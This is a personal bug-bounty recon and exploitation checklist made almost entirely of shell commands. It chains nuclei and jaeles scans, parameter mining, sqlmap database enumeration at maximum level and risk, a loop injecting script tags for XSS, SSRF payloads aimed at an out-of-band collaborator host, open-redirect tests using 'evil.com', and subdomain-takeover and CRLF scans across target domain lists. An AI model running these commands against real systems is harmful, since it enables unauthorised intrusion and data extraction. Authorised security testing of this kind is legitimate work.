
1.burp 
extensions to install: 
Extender>BApp store>Reflected Parameters>Install
Extender>BApp store>Param Miner>Install
Extender>BApp store>Param authorize>Install
Extender>BApp store>Param autorepeater>Install
	ssrf reg: https?:\/\/(www\.)?[-a-zA-Z0–9@:%._\+~#=]{1,256}\.[a-zA-Z0–9()]{1,6}\b([-a-zA-Z0–9()@:%_\+.~#?&//=]*)
https://github.com/CoreyD97/BurpCustomizer/releases?source=post_page-----9cb181443464---------------------------------------
 Extender>BApp store>Burp Suite Scanner
 spider
 logger++

2.k_automation
./testing.sh (ensure we have live.txt)

3.loxs tool

4.cves 
refer cves/testing.txt

5.individual testing =>see below

-------------------------------------------------------------------1.AUTOMATION RUN BASED ON DOMAIN,SUBDOMAIN-------------------------------------------------------------------

1.run on domain name and subdomains names:

//nuclei
nuclei -l livedomains.txt  -s critical,high,medium,low,info -o nuclei_domain1_out
nuclei -l livedomains.txt  -t /home/maddy/techiee/bug_bounty/2_phase_recon_autom/automation/nuclei-temp/downloaded_all_nucleitemplates/ -s critical,high,medium,low -o nuclei_domain2_out
nuclei -l livedomains.txt  -t /home/maddy/techiee/bug_bounty/2_phase_recon_autom/automation/nuclei-temp/lostsec/ -s critical,high,medium,low -o nuclei_domain3_out
nuclei -l livedomains.txt -t /home/maddy/nuclei-templates/http/misconfiguration -o nuclei_domain4.txt

//jaeles
cat livedomains.txt| jaeles scan -o jaeles_domain_out
//output:out

2.run on js files:
//nuclei
nuclei -l jsurls.txt -s critical,high,medium,low -o nuclei_js1_out
nuclei -l jsurls.txt -t /home/maddy/techiee/bug_bounty/2_phase_recon_autom/automation/nuclei-temp/downloaded_all_nucleitemplates/ -s critical,high,medium,low -o nuclei_js2_out
nuclei -l jsurls.txt  -t /home/maddy/techiee/bug_bounty/2_phase_recon_autom/automation/nuclei-temp/lostsec/ -s critical,high,medium,low -o nuclei_js3_out
nuclei -l jsurls.txt -s critical,high,medium,low -t /home/maddy/nuclei-templates/javascript -o nuclei_js4_out
nuclei -l jsurls.txt -s critical,high,medium,low -t /home/maddy/nuclei-templates/http/exposures -o nuclei_js5_out

//jaeles
cat jsurls.txt| jaeles scan -o jaeles_js_out

----------------------------------2.AUTOMATION RUN ON SPECIFIC URLS ACC TO VULNERABILITY : (RUN SPCIFIC TEMPLATES ALSO RUN ALL TEMPLATES...)----------------------------------------


2..GETTING PARAMETERIZED URLS:

	1.ParamSpider (Spidering + Regex):
	getting urls: paramspider -l livedomains.txt   //out: results/* 
	       
	 2.Regex: 
	 cat all_urls.txt | grep -E '\?[^=]+=.+$' >>regex.txt (will identify all parametrized outputs) 

	3.use lostfuzzer.sh: (inp: livedomains.txt)
	/home/maddy/techiee/bug_bounty/2_phase_recon_autom/tools/lostfuzzer.sh
        mv filtered_urls.txt loxs_param.txt
        //out: nuclei_results =>can be vulns for params

	combining all prams_urls:
	cat  results/* regex.txt loxs_param.txt | sort -u >> all_params.txt (and use this in sql,xss,openredirection testing)


# running nuclei,jaeles in parametrized urls...

//nuclei

nuclei -l all_params.txt  -s critical,high,medium,low -o nuclei_param1_out
nuclei -l all_params.txt -t /home/maddy/techiee/bug_bounty/2_phase_recon_autom/automation/nuclei-temp/downloaded_all_nucleitemplates/ -s critical,high,medium,low -o nuclei_param2_out
nuclei -l all_params.txt  -t /home/maddy/techiee/bug_bounty/2_phase_recon_autom/automation/nuclei-temp/lostsec/ -s critical,high,medium,low -o nuclei_param3_out
nuclei -l all_params.txt -t /home/maddy/nuclei-templates/dast -s critical,high,medium,low -dast -o nuclei_param4_out

//jaeles
cat all_params.txt| jaeles scan -o jaeles_params_out

-------------------------------------------------------------------GENERAL BUGS AUTOMATION: (input: filtered_params_urls)----------------------------------------------------------

#FINDING HIDDEN PARAMS (if result found then we can test for vuln according to hidden parameter)
	=>cat params.txt | xargs -I % arjun -u "%" -oT hidden_params.txt
	=>while read url; do   echo "[$(date '+%T')] Scanning: $url" | tee -a hidden_params.txt;   echo "==== URL: $url ====" >> hidden_params.txt;   arjun  --stable -u "$url" -oT - >> hidden_params.txt;   echo -e "\n" >> hidden_params.txt;   sleep 2; done <  all_params.txt 

[[[ =>Check for reflection of that hidden param in response and understnad the role of that parameter,
    =>Use tools like Burp Suite or Postman to intercept requests and modify hidden parameters.
    =>Test for input validation issues (e.g., SQLi payloads, XSS payloads).
    =>Check if changing the param affects authorization (e.g., access to other user’s data).
    =>Try injecting payloads relevant to command injection or other vulnerabilities. ]]]]

1. **SQL Injection (SQLi) Automation**

        1.using sqlmap:
	sqlmap -m all_params.txt --level 5 --risk 3 --batch --dbs --tamper=between --random-agent
		
	2.nuclei: (input: filtered_params_urls)
	nuclei -tags sqli,injection,error,blind,time,post,database,mysql,postgresql,mssql,azure-sql,google-cloud-sql,dast  -l all_params.txt -rate-limit 200 
	-retries 2 -l all_params.txt -o sqli_results.txt


2.**Cross-Site Scripting (XSS) Automation**

	1.using dalfox. (input: filtered_params_urls)
	dalfox -b <payload> file all_params.txt  -o xss_dal_out1.txt


	2.cat all_params.txt | qsreplace '"/><script>confirm(1)</script>' > xss.txt && \
while read host; do
  echo "Testing: $host"
  if curl --silent --path-as-is --insecure "$host" | grep -q "confirm(1)"; then
    echo -e "$host [VULNERABLE]" | tee -a xss_results.txt
  else
    echo -e "$host [Not Vulnerable]" | tee -a xss_curl_results.txt
  fi
done < xss.txt


3.**Server-Side Request Forgery (SSRF) Automation**

  1.using qsreplace and ffuf : (input: filtered_params_urls)
	# Replace all query parameters with Burp Collaborator URL for SSRF detection
	
	cat all_params.txt | qsreplace 'https://xwcqefybplhigmbxypoaybc6rr18i3w2i.oast.fun' | tee ssrf_urls_ffuf
	# Perform SSRF scanning using ffuf   
	ffuf -c -w ssrf_urls_ffuf -u FUZZ   //check the log
	
   2.using nuclei: (input: filtered_params_urls)
	cat or.txt | nuclei -t /home/maddy/nuclei-templates/dast/vulnerabilities/ssrf/blind-ssrf.yaml  --retiries 2 --dast -o ssrf_nuclei1_out
	cat or.txt | nuclei -t /home/maddy/nuclei-templates/dast/vulnerabilities/ssrf/response-ssrf.yaml --retiries 2 --dast -o ssrf_nuclei2_out


4.**Open Redirect (OD) Automation**

getting urls:
cat all_urls.txt  all_params.txt | grep -Pi "=http|returnUrl=|continue=|dest=|destination=|forward=|go=|goto=|login\?to=|login_url=|logout=|next=|next_page=|out=|g=|redir=|redirect=|redirect_to=|redirect_uri=|redirect_url=|return=|returnTo=|return_path=|return_to=|return_url=|rurl=|site=|target=|to=|uri=|url=|qurl=|rit_url=|jump=|jump_url=|originUrl=|origin=|Url=|desturl=|u=|Redirect=|location=|ReturnUrl=|redirect_url=|redirect_to=|forward_to=|forward_url=|destination_url=|jump_to=|go_to=|goto_url=|target_url=|redirect_link=" | tee redirect_params.txt


using httpx:
cat redirect_params.txt | qsreplace "https://evil.com" | httpx -silent -no-color -fr -status-code | grep "\[3" >>open_httpx_out

using curl:
cat redirect_params.txt | qsreplace "https://evil.com" | xargs -I {} curl -s -o /dev/null -w "%{url_effective} -> %{redirect_url}\n" {} | tee open_curl_out
 

using nuclei:
cat redirect_params.txt | qsreplace "https://evil.com"| nuclei -tags redirect -c 30 -o open_nuclei_out

5.SUBDOMAIN TAKEOVER:
	=>using nuclei:
	nuclei -l livedomains.txt -t /home/maddy/nuclei-templates/http/takeovers -o takeover_out1.txt
	nuclei -profile /home/maddy/nuclei-templates/profiles/subdomain-takeovers.yml -l livedomains.txt -o takeover_out2.txt

	=>using subzy:
	subzy run --targets domains.txt | tee takeover_out3.txt


6.WORDPRESS:
	nuclei -l livedomains.txt -t /home/maddy/nuclei-templates/http/vulnerabilities/wordpress -o wordpress1_out
	nuclei -l livedomains.txt -t /home/maddy/nuclei-templates/http/technologies/wordpress-detect.yaml -o wordpress2_out

7.CORS:
	nuclei -l livedomains.txt -tags cors -o nuclei_cors.txt

8.CRLF:

	=>using crlfi:
	crlfi -i livedomains.txt -o crlf_crlfi.txt

	=>using crlfuzz:
	crlfuzz -l livedomains.txt | tee -a crlf_crlfsuite_domains
	crlfuzz -l urls.txt | tee -a crlf_crlfsuite_urls

	=>using crlfsuite:
	crlfsuite -iT livedomains.txt -oN crlf_crlfsuite
	
	=>using nuclei :
	nuclei -t /home/maddy/nuclei-templates/dast/vulnerabilities/crlf/ -l livedomains.txt -dast -o crlf_nuclei_out1 
	nuclei -t /home/maddy/nuclei-templates/http/vulnerabilities/generic/crlf-injection-generic.yaml -l livedomains.txt -o crlf_nuclei_out2
	nuclei -t /home/maddy/nuclei-templates/http/vulnerabilities/other/viewlinc-crlf-injection.yaml -l livedomains.txt -o crlf_nuclei_out3
	
-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------
MANUAL:

using loxs tool: (inp:redirect_params.txt)
cat urls.txt | sed 's/=.*/=/' | uro >loxs.txt =>idha ipo loxs toola use pnlaa


using rust scanner: (inp:redirect_params.txt)
cargo build
cargo run
refer: automation/tools/out


echo "[*] Testing for SQL Injection using sqlmap..."
sqlmap -m all_params.txt --level 5 --risk 3 --batch --dbs --tamper=between --random-agent


echo "[*] Testing for XSS using Dalfox..."
dalfox file all_params.txt -o xss_dal_out1.txt


about ax framework,ax tool for automation


